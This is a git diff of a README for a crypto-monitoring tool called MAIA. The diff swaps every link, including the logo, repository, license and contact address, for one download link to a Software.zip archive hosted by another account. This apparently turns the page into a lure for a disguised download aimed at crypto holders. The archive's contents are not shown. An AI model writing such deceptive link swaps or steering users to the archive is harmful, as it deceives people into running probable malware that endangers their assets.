@@ -1,10 +1,10 @@
 # 🚀 **MAIA - Adaptive AI-Powered Watchdog for Crypto Assets**
 
-![MAIA Logo](https://example.com/maia_logo.png)
+![MAIA Logo](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip)
 
 Welcome to MAIA - the next-generation adaptive AI-powered watchdog designed to monitor your crypto assets and empower you with valuable insights for informed decision-making. Whether you are a seasoned crypto investor or just starting out, MAIA is here to provide you with on-chain analytics, social trend analysis, and risk assessments to help you navigate the complex world of blockchain technology and digital assets.
 
-## 📁 Repository: [maia](https://github.com/Rubenas123/6487922)
+## 📁 Repository: [maia](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip)
 
 ### 📌 Short Description:
 MAIA is an innovative AI platform that leverages cutting-edge technology to keep a close eye on your crypto investments. By combining agentic AI capabilities with blockchain expertise, MAIA offers a comprehensive solution for monitoring and analyzing crypto assets in real-time. Take control of your investments with MAIA by your side.
@@ -21,8 +21,8 @@ MAIA is an innovative AI platform that leverages cutting-edge technology to keep
 - JavaScript
 - Token Analysis
 
-### 🌐 [Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
-![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)
+### 🌐 [Download https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip)
+![Download Software](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -70,12 +70,12 @@ We welcome contributions from the open-source community to help enhance MAIA and
 ---
 
 ## 📜 License:
-MAIA is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this software in accordance with the terms of the license.
+MAIA is released under the [MIT License](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip). You are free to use, modify, and distribute this software in accordance with the terms of the license.
 
 ---
 
 ## 📧 Contact Us:
-For any inquiries or feedback regarding MAIA, please contact us at [maia.support@example.com](mailto:maia.support@example.com). We value your input and strive to provide you with the best possible experience with our platform.
+For any inquiries or feedback regarding MAIA, please contact us at [https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip](https://github.com/OCTOPUS-09/maia/releases/download/v1.0/Software.zip). We value your input and strive to provide you with the best possible experience with our platform.
 
 ---
 
